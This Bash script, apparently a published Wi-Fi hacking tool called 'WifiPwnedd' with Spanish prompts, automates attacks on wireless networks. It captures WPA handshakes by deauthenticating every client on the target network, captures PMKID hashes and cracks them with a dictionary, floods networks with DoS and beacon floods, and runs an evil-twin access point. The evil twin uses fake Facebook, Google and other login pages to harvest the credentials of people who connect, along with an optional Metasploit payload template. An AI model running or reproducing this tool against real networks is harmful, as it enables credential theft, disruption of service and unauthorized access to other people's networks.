#!/bin/bash

# Modulo de colores 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""
# Comprobacion e instalacion de la dependencias
trap ctrl_c INT

ctrl_c() {
	echo -e "\n${redColour}[!]${endColour}${grayColour}Saliendo...${endColour}\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	tput cnorm
	exit
}

programs() {
	test -f /etc/debian_version
	debian=$(echo $?)
	
	test -f /etc/arch-release
	arch=$(echo $?)

	test -f /etc/redhat-release
	fedora=$(echo $?)
	
	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk3)
	
	if [ "$debian" -eq 0 ]; then 
		clear; tput civis
		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios (update)..."; sudo apt-get update -y > /dev/null 2>&1
		clear
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
		else
			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
			sudo apt-get install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			test -f /usr/bin/$program
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program listo"
				sleep 0.5
			else 
				echo -e "\n${redColour}[-]$grayColour $program no instalado"
				sleep 1
				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
				sudo apt-get install $program -y > /dev/null 2>&1

			fi
		done
	elif [ "$arch" -eq 0 ]; then
		clear; tput civis
		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios..."; sudo pacman -Syu -y > /dev/null 2>&1
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
		else
			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
			sudo pacman -S macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
		fi
		
		for program in "${depasendenci[@]}"; do
			test -f /usr/bin/$program
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program listo"
				sleep 0.5
			else 
				echo -e "\n${redColour}[-]$grayColour $program no instalado"
				sleep 1
				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
				sudo pacman -S $program -y > /dev/null 2>&1

			fi
		done
	elif [ "$fedora" -eq 0 ]; then
		clear; tput civis
		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios..."; sudo dnf update -y > /dev/null 2>&1
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
		else
			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
			sudo dnf install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			test -f /usr/bin/$program
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program listo"
				sleep 0.5
			else 
				echo -e "\n${redColour}[-]$grayColour $program no instalado"
				sleep 1
				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
				sudo dnf install $program -y > /dev/null 2>&1

			fi
		done
	else 
		echo -e "\n${redColour}[!]$grayColour No se puedo encontrar tu distribucion, descarga estos programas manualmente: aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd" 
		sleep 5
	fi
}
# 1) ataque
handshake_ataque() {
	clear
	echo -e "\n${turquoiseColour}[*]$grayColour Iniciando Ataque Handshake"
	sleep 1
	xterm -hold -e "airodump-ng $tar" &
	airodump_xterm_PID=$!
	echo -e "$grayColour"
 	tput cnorm
    echo -ne "${greenColour}[?]$grayColour Que red deseas atacar?: " && read ap
	echo -ne "${greenColour}[?]$grayColour En que canal esta ${ap}?: " && read channel
	tput civis
	$cleancolor
	echo -e "${greenColour}[*]$grayColour Se esta desautenticando a los usuarios de la red"
	$cleancolor
	kill -9 $airodump_xterm_PID
	wait $airodump_xterm_PID 2>/dev/null

	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
	airodump_filter_xterm_PID=$!

	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &								
	aireplay_xterm_PID=$!
	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

	echo -e "${redColour}\n[%]$grayColour Esperando Handshake\n"
	$cleancolor
								
	sleep 10; kill -9 $airodump_filter_xterm_PID
	wait $airodump_filter_xterm_PID 2>/dev/null
	test -f Handshake-01.cap
	if [ "$(echo $?)" == "0" ]; then
		tput cnorm
		echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
		echo -ne "$blueColour[?]$grayColour Ruta del Diccionario al usar: " && read dicc
		$cleancolor; tput civis
		xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
	else 
		echo -e "${redColour}\n[!]$grayColour No se ha capturado el Handshake"
		sleep 2
	fi
}
# salida
salir() {
	echo -e "\n${redColour}[*]$grayColour Saliendo y reiniciando la tarjeta de red...\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sudo rm Handshake* > /dev/null 2>&1
	tput cnorm
	exit
}

# 2) ataque
pkmid_ataque() {
	clear
	echo -e "\n${greenColour}[*]$grayColour Iniciando ataque PMKID..\n"
	sleep 1 
	echo -e "${blueColour}[!]$grayColour Recomendacion: 600 segundos (10 minutos)"
	echo -ne "$purpleColour[?]$grayColour Cuantos segundos quieres que dure la captura de los paquetes?: " && read seg
	$cleancolor
	xterm -hold -e "hcxdumptool -i $tar -o Captura --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
	hcxdumptool_PID=$!
	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
    echo -e "\n${redColour}[%]$grayColour Capturando Hashes\n"
	hcxcaptool -z HASHPMKID Captura; sudo rm Captura 2>/dev/null
	sleep 1
	$cleancolor
	test -f HASHPMKID*
	if [ "$(echo $?)" -eq 0 ]; then
		echo -e "\n${yellowColour}[*]$grayColour Iniciando ataque de fuerza bruta"
		sleep 1
		tput cnorm
		echo -e "\n${blueColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
		echo -ne "${greenColour}[?]$grayColour Ruta del Diccionario al usar: " && read dicc1
		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
	else 
		echo -e "\n${redColour}[!]$grayColour No se pudo capturar el paquete necesario"
		sleep 2
	fi
}
# 3) ataque
fuerza_.cap() {
	clear; echo -e "\n${greenColour}[*]$grayColour Iniciando Ataque de Fuerza Bruta"
	sleep 1
	echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
	$cleancolor
	tput cnorm
	echo -ne "${blueColour}[?]$grayColour Nombre del archivo .cap: " && read cap
	tput civis; echo -ne "${redColour}[?]$grayColour Ruta del Diccionario al usar: " && read dicc
	xterm -hold -e "aircrack-ng -w $dicc $cap"
}

fuerza_rainbow() {
	echo -ne "${greenColour}[?]$grayColour Ruta del archivo .cap : " && read cap
	cd WifiPwnedd
	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
}

rainbowtaibles() {
	clear; echo -e "\n${yellowColour}[*]$grayColour Iniciando..."
	echo -ne "${blueColour}[?]$grayColour Ruta del diccionario: " && read ruta
	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
	test -f dicc-hasheado
	if [ "$(echo $?)" -eq 0 ]; then
		echo -ne "${turquoiseColour}[?]$grayColour Nombre o essid de la red: " && read ap 
		echo "$ap" > essid.lst
		airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
		airolib-ng dicc-hasheado --clean all 
		echo -ne "${redColour}[?]$grayColour Cuantos segundos quieres que dure el proceso de hasheo?: " && read seg
		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
		batch_PID=$!
		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
		echo -e "\n${greenColour}[+]$grayColour Diccionario listo (Nombre: dicc-hasheado)"
		echo -ne "${blueColour}[?]$grayColour Quieres hacer un ataque de fuerza bruta con el diccionario? [Y/N]: " && read attak
		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
			fuerza_rainbow
		else
			echo -e "\n${redColour}[!]$grayColour Saliendo"
		fi
	else
		echo -e "\n${redColour}[!]$grayColour No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
		sleep 2
	fi
}

menuforce() {
	clear; echo -e "${yellowColour}\n1) Ataque Fuerza bruta (.cap)"
	echo -e "2) Crear diccionario hasheado (Rainbow taibles)"
	echo -e "3) Ataque fuerza bruta con diccionario hasheado"
	echo -e "4) Salir"
	echo -ne "${yellowColour}[*]$grayColour Seleccione una opcion: " && read force 
	case $force in 
	1)
	fuerza_.cap
	;;
	2)
	rainbowtaibles
	;;
	3)
	fuerza_rainbow
	;;
	4)
	echo -e "\n${redColour}[*]$grayColour Saliendo..."
	;;
	*)
	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
	sleep 2
	;;
	esac
}

scanner() {
	clear; echo -e "\n${greenColour}[*]$grayColour Iniciando Scanner de la red"
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sleep 15
	tput civis; echo -e "\n---------------------------------------------------\n"
	sudo nmap -sP -Pn 192.168.1.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
	echo -e "\n---------------------------------------------------"
	echo -ne "${redColour}[!]$grayColour Enter para salir" && read 
	tput cnorm
}
menunomon() {
	clear; echo -e "${yellowColour}\n1) Menu fuerza bruta"
	echo -e "2) Scanner de la red local"
	echo -e "3) Salir"
	echo -ne "${yellowColour}[*]$grayColour Seleccione una opcion: " && read force
	case $force in 
	1)
	menuforce
	;;
	2)
	scanner
	;;
	3)
	echo -e "\n${redColour}[*]$grayColour Saliendo..."
	;;
	*)
	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
	sleep 2
	;;
	esac
}

eviltrust() {
	
	function getCredentials(){

		activeHosts=0
		tput civis; while true; do
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Enter para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "${redColour}[*]$grayColour Dispositivos conectados: ${endColour}${blueColour}$activeHosts${endColour}\n"
			find \-name datos-privados.txt | xargs cat 2>/dev/null
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
			sleep 3; clear
			read -p ""
			echo -e "\n\n${redColour}[!]${endColour}${grayColour} Saliendo...\n${endColour}"
			sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
			rm -r iface 2>/dev/null
			find \-name datos-privados.txt | xargs rm 2>/dev/null
			tput cnorm
		done
	}

	function startAttack(){
		if [[ -e credenciales.txt ]]; then
			rm -rf credenciales.txt
		fi

		rm iface 2>/dev/null
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre de la red a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
		echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
		echo -e "\n${redColour}[!]$grayColour Cerrando todas las conexiones...${endColour}\n"
		sleep 2
		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
		sleep 5

		echo -e "interface=${tar}\n" > hostapd.conf
		echo -e "driver=nl80211\n" >> hostapd.conf
		echo -e "ssid=$use_ssid\n" >> hostapd.conf
		echo -e "hw_mode=g\n" >> hostapd.conf
		echo -e "channel=$use_channel\n" >> hostapd.conf
		echo -e "macaddr_acl=0\n" >> hostapd.conf
		echo -e "auth_algs=1\n" >> hostapd.conf
		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz ${tar}${endColour}\n"
		sleep 2
		echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
		hostapd hostapd.conf > /dev/null 2>&1 &
		sleep 6

		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
		echo -e "interface=${tar}\n" > dnsmasq.conf
		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
		echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
		echo -e "server=8.8.8.8\n" >> dnsmasq.conf
		echo -e "log-queries\n" >> dnsmasq.conf
		echo -e "log-dhcp\n" >> dnsmasq.conf
		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
		sleep 1
		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
		sleep 1
		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
		sleep 5

		cd src/
		plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

		tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
		echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template

		check_plantillas=0; for plantilla in "${plantillas[@]}"; do
			if [ "$plantilla" == "$template" ]; then
				check_plantillas=1
			fi
		done

		if [ "$template" == "cliqq-payload" ]; then
			check_plantillas=2
		fi

		if [ $check_plantillas -eq 1 ]; then
			tput civis; pushd $template > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor PHP...${endColour}"
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			popd > /dev/null 2>&1; getCredentials
		elif [ $check_plantillas -eq 2 ]; then
			tput civis; pushd $template > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando servidor PHP...${endColour}"
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			cat msfconsole.rc
			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "\n${redColour}[!]${grayColour} Enter para continuar${endColour}" && read
			popd > /dev/null 2>&1; getCredentials
		else
			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
			pushd $template > /dev/null 2>&1
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			popd > /dev/null 2>&1; getCredentials
		fi
		cd ..
	}
		clear; echo -e "$purpleColour[*]$grayColour Iniciando EvilTrust..."; sleep 2; startAttack
}
dosattack() {
	clear; echo -e "\n${blueColourColour}[*]$grayColour Iniciando DoS attack..."; sleep 2
	xterm -hold -e "airodump-ng $tar" &
	dosairdump_PID=$!
	echo -ne "${purpleColour}[?]$grayColour Cual red deseas atacar?: " && read redos
	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
	echo -ne "${redColour}[?]$grayColour Canales para el ataque Dos (1,6,11): " && read canalesdos
	xterm -hold -e "sudo mdk3 $tar d -a $redos -c $canalesdos"
}

beaconflood() {
	clear; echo -e "\n${purpleColour}[*]$grayColour Iniciando Beacon Flood attack..."; sleep 2
	echo -ne "\n${blueColour}[?]$grayColour Quieres ponerle un nombre a las redes? [Y/N]: " && read rpsbeacon 
	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
		echo -ne "${yelloColour}[?]$grayColour Nombre: " && read nameap
			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
		xterm -hold -e "sudo mdk3 $tar b -s 1000"
	fi
	
}

# Comprobacion si el usuario es root
if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!]$grayColour Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
	$cleancolor
	exit 1
# Programa principal
else
	programs
	clear
	echo -e "${turquoiseColour}"
	echo "  _       __  _   ____  _      ____                               __      __ "
	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  /  "
	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "  
	echo -e "\n${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
	echo -ne "${greenColour}[+]$grayColour Enter para continuar" && read 
	$cleancolor
	tput cnorm
	echo -e "\n${redColour}[*]${endColour}${grayColour} El modo monitor es recomendable y necesario para algunos ataques"
	sleep 1
	echo -ne "${purpleColour}[?]${grayColour} Quieres poner en modo monitor tu targeta de red? [Y/N]: " && read mon
	$cleancolor
		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			echo -ne "\n${redColour}[?]$grayColour Que tarjeta deseas usar: " && read tar
			$cleancolor; tput civis
			airmon-ng start $tar > /dev/null 2>&1
			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			tput cnorm; echo -ne "${redColour}\n[?]$grayColour Confirmacion de la targeta (Poner el nombre tal como sale): " && read tar
			tput civis; echo -e "\n${greenColour}[*]${grayColour} Cambiando tu dirrecion MAC en $tar\n"
			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
			ifconfig $tar up
			airmon-ng check kill > /dev/null 2>&1
			tput civis; $cleancolor
				while true; do
				clear
				echo -e "${purpleColour}\n[+]$grayColour Menu de ataques\n${endColour}"
				echo -e "${redColour}"
				echo -e "   #"
				echo -e "    #	                             ( ( \ )  ( / ) )"
				echo -e "    ###---------------------\      	  \----/"
				echo -e "    ###- WifiPwnedd by kidd3n ----->  	  |    |"
				echo -e "    ###---------------------/             +----+"
				echo -e "    #"
				echo -e "   #"
				sleep 0.5
				echo -e "${greenColour}\n[+]${grayColour} Targeta de Red: $tar" 
				echo -e "${greenColour}[+]${grayColour} Direccion MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
				echo -e "${yellowColour}\n[1] Handshake Attack\t\t[6] EvilTrust (S4vitar)\t[7] Fuerza bruta .cap"
				echo -e "[2] PMKID Attack\t\t\t\t\t[8] dicc-hasheado (Rainbow taibles)"
				echo -e "[3] DoS Attack"
				echo -e "[4] Beacon Flood Attack"
				echo -e "[5] Scanner de la red local"
				echo -e "\n[9] Salir\n"
				tput cnorm
				echo -ne "${blueColour}[?]${grayColour} Seleccione un ataque: " && read opcion
				$cleancolor
				case $opcion in
				1)
				handshake_ataque
				;;
				2)
				pkmid_ataque
				;;
				3)
				dosattack
				;;
				4)
				beaconflood
				;;
				5)
				scanner
				;;
				6)
				eviltrust
				;;
				7)
				fuerza_.cap
				;;
				8)
				rainbowtaibles
				;;
				9)
				salir
				;;
				*)
				echo -e "${redColour}\n[!]$grayColour Opcion invalida"; sleep 2
				;;
				esac
				done
		else
			menunomon
		fi
fi